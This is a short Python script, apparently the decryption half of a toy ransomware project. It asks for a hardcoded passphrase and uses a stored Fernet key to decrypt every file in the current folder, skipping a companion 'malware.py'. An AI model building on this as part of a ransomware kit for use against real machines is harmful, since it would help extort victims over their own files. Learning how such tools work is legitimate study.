#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
	if file == "malware.py" or file == "thekey.key" or file == "descypt.py":
		continue 
	if os.path.isfile(file):
		files.append(file)

print (files)

with open ("thekey.key", "rb") as key: 
	secretkey = key.read()
passphrase = "Cy3ers3c"
upassword = input("Enter the password to decrypt your files: ")
if upassword == passphrase: 
	for file in files: 
		with open(file, "rb") as thefile: 
			content = thefile.read()
		content_decrypt = Fernet(secretkey).decrypt(content)
		with open(file, "wb") as thefile: 
			thefile.write(content_decrypt)
		print("Your recovered all your files")
else:
	print("Enter the rigth password to recover your files")
